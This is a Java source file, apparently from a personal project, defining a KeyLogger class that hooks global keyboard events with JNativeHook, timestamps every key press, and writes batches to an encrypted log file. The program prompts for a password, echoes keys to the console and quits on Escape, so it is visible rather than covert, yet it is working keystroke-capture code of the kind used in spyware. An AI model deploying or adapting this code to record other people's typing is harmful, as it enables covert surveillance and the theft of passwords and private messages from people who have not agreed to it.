package com.github.giorgosg1an;

import java.util.ArrayList;
import java.util.List;

import javax.swing.JOptionPane;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener{

    private static final int FLUSH_THRESHOLD = 20;
    private final List<String> buffer = new ArrayList<>();
    private final EncryptedLogger logger;
    

    public KeyLogger() {
        EncryptedLogger tmp = null;
        try {
            String password = JOptionPane.showInputDialog(null, "Enter encryption password: ");
            tmp = new EncryptedLogger(password.toCharArray());
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }

        this.logger = tmp;
    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String timestamp = TimestampUtil.now();
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        String entry = "[" + timestamp + "] Key: " + keyText;
        buffer.add(entry);
        System.out.println(entry);

        if (buffer.size() >= FLUSH_THRESHOLD) {
            flushBuffer();
        }

        // Exit on ESC Key
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            flushBuffer();
            System.out.println("Exiting keylogger.");

            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException ex) {
                System.out.println(ex.getMessage());
            }
            System.exit(0);
        }
    }

    private void flushBuffer() {
        if (buffer.isEmpty()) {
            return;
        }

        try {
            String fullLog = String.join("\n", buffer);
            logger.encryptAndWrite(fullLog);
            buffer.clear();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
